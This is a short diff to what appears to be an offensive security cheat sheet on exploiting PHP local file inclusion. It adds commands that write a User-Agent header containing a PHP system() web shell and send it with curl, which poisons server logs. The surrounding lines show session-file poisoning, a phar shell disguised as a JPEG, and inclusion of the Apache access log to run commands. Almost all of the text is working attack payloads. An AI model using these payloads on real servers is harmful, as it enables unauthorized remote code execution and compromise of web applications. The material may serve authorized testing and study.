@@ -1607,6 +1607,8 @@ $ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 /index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
 /index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
 /index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
 $ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
 /index.php?language=/var/log/apache2/access.log&cmd=id
 ```
